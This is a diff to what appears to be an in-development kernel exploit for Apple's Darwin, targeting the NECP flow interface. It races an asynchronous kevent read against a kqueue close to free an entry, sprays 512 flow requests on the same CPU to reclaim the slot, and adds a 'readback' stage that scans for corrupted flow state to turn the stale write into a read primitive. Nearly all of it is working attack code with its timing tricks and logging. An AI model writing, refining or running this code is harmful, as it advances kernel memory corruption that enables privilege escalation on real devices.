@@ -56,7 +56,9 @@
 #import <stdatomic.h>
 #import <mach/mach_time.h>
 
-#define T8_BUILD @"t8-necp-reclaim-v1"
+#define T8_BUILD @"t8-necp-reclaim-v2"   /* v2: the READBACK (the 02:25
+   receipt: the armed race HIT + 512/512 flows + SURVIVED — but the
+   silent-corruption receipt was discarded with the fd close). */
 
 #ifndef SIGEV_KEVENT
 #define SIGEV_KEVENT 4   /* the AVEOpenSmoke Darwin law (tap line 11258) */
@@ -138,6 +140,11 @@ static void t8_reap(struct aiocb *cb) {
 struct t8_req {
     uint8_t cid[16];
     uint8_t req[NECP179_FLOW_REQ_SIZE];
+    /* v2 readback: the kernel copyout writes the flow's state back INTO req
+       (the result/uuid area +0x00..0x0f and the stats RMW +0x24..0x3c) —
+       snapshot both after every call. The discarded receipt channel. */
+    uint8_t snap_res[0x10];
+    uint8_t snap_st[0x18];
 };
 static struct t8_req t8_reqs[T8_BATTERY_N];
 static int t8_req_n = 0;
@@ -145,6 +152,10 @@ static int t8_nfd = -1;
 static int t8_flows_ok = 0;
 static uint64_t t8_spray_us = 0;
 
+static volatile int t8_closed = 0;   /* v2: the closer's done flag — the main
+   thread gives the closer a 200 ms window (the 02:25 receipt: the closer
+   missed the kq and the fallback fired 3 s late, squandering the magazine
+   LIFO). After the window, main does the close+battery itself. */
 static volatile int t8_spray_go = 0;   /* plain volatile — the memory-ordering
    law is the P177 sprayGo pattern: the closer only reads it after its own
    close() returns, and the battery is idempotent (spray_go cleared before
@@ -159,7 +170,12 @@ static void t8_fire_battery(void) {
     for (int i = 0; i < t8_req_n; i++) {
         int rc = necp179_add_flow_req(t8_nfd, t8_reqs[i].cid,
                                       t8_reqs[i].req, NECP179_FLOW_REQ_SIZE);
-        if (rc == 0) ok++;
+        if (rc == 0) {
+            ok++;
+            /* v2: the copyout landed the flow state in req — keep it */
+            memcpy(t8_reqs[i].snap_res, t8_reqs[i].req, 0x10);
+            memcpy(t8_reqs[i].snap_st, t8_reqs[i].req + 0x24, 0x18);
+        }
     }
     uint64_t t1 = mach_absolute_time();
     t8_spray_us = (t1 - t0) * tb.numer / tb.denom / 1000;
@@ -184,6 +200,7 @@ static void *t8_closer(void *arg) {
                     t8_spray_go = 0;
                     t8_fire_battery();  /* same-CPU magazine LIFO — the claim */
                 }
+                t8_closed = 1;          /* v2: the window flag */
             }
         }
     }
@@ -341,11 +358,17 @@ static void *t8_closer(void *arg) {
     }
 
     t8_lookup = kq;
+    t8_closed = 0;
     t8_do_close = 1;                     /* arm the closer (spray_go held) */
     t8_fill_kevent(&occ, kq);
     int rc = t8_aio_read(&occ);          /* the racer — races the close */
     int saved = errno;
     t8_do_close = 0;
+    /* v2: give the closer a 200 ms window to take the kq itself (the free +
+       the battery on ITS cpu = the magazine-LIFO design). Only if it truly
+       missed does main close — and then the battery fires IMMEDIATELY (the
+       3 s wait is gone). */
+    for (int i = 0; i < 200 && !t8_closed; i++) usleep(1000);
     if (t8_lookup == kq) { t8_lookup = -1; close(kq); }
 
     int window = (rc != 0 && saved == EAGAIN);
@@ -353,16 +376,17 @@ static void *t8_closer(void *arg) {
            rc, saved, window ? "HIT (EAGAIN — the entry freed)" : "miss");
     t8_reap(&occ);
 
-    /* the battery: the closer fires it post-close on ITS cpu; if the closer
-       never consumed the lookup (we closed kq ourselves), fire the fallback
-       on the main thread and record the weaker placement. */
-    for (int i = 0; i < 3000 && !atomic_load(&t8_spray_done); i++) usleep(1000);
+    /* v2: the fallback fires IMMEDIATELY (50 ms max wait — the 02:25 receipt
+       squandered the LIFO window with a 3 s wait). The main-thread close (if
+       the closer missed) put the free on MAIN's cpu — so the main-thread
+       battery is same-cpu CORRECT in that path. */
+    for (int i = 0; i < 50 && !atomic_load(&t8_spray_done); i++) usleep(1000);
     int fallback = 0;
     if (!atomic_load(&t8_spray_done) && t8_spray_go) {
         t8_spray_go = 0;
         fallback = 1;
-        t8_fire_battery();               /* the fallback — main-cpu placement */
-        t8_log("STEP4 battery FALLBACK (main thread — the closer missed the kq)");
+        t8_fire_battery();               /* same-cpu (main closed the kq) */
+        t8_log("STEP4 battery on MAIN (the closer missed — main closed, same-cpu OK)");
     }
     if (atomic_load(&t8_spray_done))
         t8_log("STEP4 battery fired: flows_ok=%d/%d in %llu us (%s-cpu)%s",
@@ -385,6 +409,66 @@ static void *t8_closer(void *arg) {
     t8_log("      panic-rc = E1 + k*0xc0 names the element that took the put).");
     close(keep);
     t8_log("STEP6 close(keep) returned — the put fired into whatever holds the slot.");
+
+    /* v2 STEP 6a — THE READBACK (the 02:25 receipt's missing observation:
+       the silent corruption was discarded with the fd close). Three
+       channels, all before any teardown:
+       (a) the re-issue scan: every ADD_FLOW walks the client's whole ctx
+           list (the uuid memcmp at ctx+0x58) — a corrupted link/uuid shows
+           as an rc or state anomaly on EVERY subsequent call;
+       (b) the per-flow state diff: the copyout writes the flow state back
+           into the request — diff vs the battery snapshots;
+       (c) COPY_RESULT per client: the result dump — the cross-client diff
+           (only one flow can hold the freed slot). */
+    /* NOTE: each re-issue APPENDS a new flow (fresh uuid, no dedup at the
+       ctx layer) — so the per-flow result diff is not apples-to-apples and
+       is NOT used. The re-issue's signal is the RC: every call walks the
+       client's whole ctx list (the uuid memcmp at ctx+0x58), so a corrupted
+       link or uuid area poisons every later call — an rc anomaly on ANY of
+       the 512 = the walk broke = the put landed in a list object. */
+    int anom = 0;
+    for (int i = 0; i < t8_req_n; i++) {
+        int rc = necp179_add_flow_req(t8_nfd, t8_reqs[i].cid,
+                                      t8_reqs[i].req, NECP179_FLOW_REQ_SIZE);
+        if (rc != 0) {
+            anom++;
+            if (anom <= 8)
+                t8_log("STEP6a ANOMALY flow[%d] rc=%d errno=%d (the walk broke)",
+                       i, rc, errno);
+        }
+    }
+    t8_log("STEP6a re-issue scan: %d/%d rc anomalies (a corrupted link/uuid",
+           anom, t8_req_n);
+    t8_log("      poisons EVERY later walk — any hit = the put landed)");
+
+    /* (c) COPY_RESULT per client — the cross-client diff */
+    int cres_ok = 0;
+    uint8_t cres[8][0x400];
+    for (int c = 0; c < clients_ok; c++) {
+        int rc = necp179_copy_result(t8_nfd, cids[c], cres[c], sizeof cres[c]);
+        if (rc == 0) cres_ok++;
+        else t8_log("STEP6a COPY_RESULT client %d rc=%d errno=%d", c, rc, errno);
+    }
+    /* the diff: identical clients (same shape, same count) should dump
+       identical structure — any byte-level outlier is the receipt */
+    int outl = 0;
+    for (int c = 1; c < cres_ok; c++) {
+        size_t d = 0;
+        for (size_t b = 0; b < sizeof cres[c]; b++)
+            if (cres[c][b] != cres[0][b]) { d = b; break; }
+        if (d) {
+            outl++;
+            t8_log("STEP6a COPY_RESULT OUTLIER client %d at byte 0x%zx: "
+                   "%02x vs %02x", c, d, cres[0][d], cres[c][d]);
+        }
+    }
+    t8_log("STEP6a COPY_RESULT: %d/%d ok, %d outliers — the cross-client diff",
+           cres_ok, clients_ok, outl);
+    t8_log("      is the direct readback (only one flow can hold the slot).");
+    t8_log("STEP6a READBACK DONE — anomalies=%d outliers=%d (any hit = the",
+           anom, outl);
+    t8_log("      stale put's landing receipt = the write->read conversion).");
+
     t8_log("STEP6 close(nfd) — the flow cleanup (the corrupted-flow receipt channel).");
     close(t8_nfd); t8_nfd = -1;
     t8_log("STEP6 necp fd closed — the flow teardown ran.");
